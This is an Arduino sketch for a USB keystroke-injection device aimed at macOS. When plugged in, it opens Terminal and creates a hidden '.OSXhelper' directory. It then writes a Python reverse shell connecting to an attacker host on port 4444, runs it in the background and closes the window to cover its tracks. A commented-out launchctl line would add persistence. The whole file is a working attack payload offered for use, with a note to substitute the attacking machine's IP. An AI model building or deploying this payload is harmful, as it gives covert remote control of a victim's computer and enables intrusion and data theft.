#include <Keyboard.h>

void setup() {
  Keyboard.begin();

  /* PAYLOAD START */
  delay(3000);

  // open utilities folder and launch the terminal lab
  Keyboard.press(KEY_LEFT_GUI);
  delay(1000);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("terminal");
  delay(1000);
  typeKey(KEY_RETURN);
  
  // create hidden directory
  Keyboard.print("cd ~");
  typeKey(KEY_RETURN);
  Keyboard.print("mkdir .OSXhelper");
  typeKey(KEY_RETURN);
  Keyboard.print("cd .OSXhelper");
  typeKey(KEY_RETURN);


  // write a python reverse shell script
  // replace IP Address with your attacking machine
  Keyboard.print("echo \"python -c 'import socket,subprocess,os;");
  Keyboard.print("s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);");
  Keyboard.print("s.connect((\\\"192.168.1.2\\\",4444));");
  Keyboard.print("os.dup2(s.fileno(),0);");
  Keyboard.print("os.dup2(s.fileno(),1);");
  Keyboard.print("os.dup2(s.fileno(),2);");
  Keyboard.print("p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\" > helper.sh");
  typeKey(KEY_RETURN);

  // adjust script permission and execute the script
  Keyboard.print("chmod +rwx helper.sh");
  typeKey(KEY_RETURN);
  
  // comment out these lines are for persistence attack
  //Keyboard.print("launchctl submit -l yes -p ~/.OSXhelper/helper.sh");
  //typeKey(KEY_RETURN);
  
  Keyboard.print("./helper.sh &");
  typeKey(KEY_RETURN);
  delay(500);

  // close the terminal window
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  delay(1000);
  Keyboard.press('q');
  Keyboard.releaseAll();
  delay(500);  

  Keyboard.press(KEY_LEFT_GUI);
  delay(1000);
  Keyboard.press('w');
  Keyboard.releaseAll();
  delay(500);  
  /* PAYLOAD END */
  
  Keyboard.end();
}
void loop() {}

void typeKey(int key){
  Keyboard.press(key);
  delay(500);
  Keyboard.release(key);
}

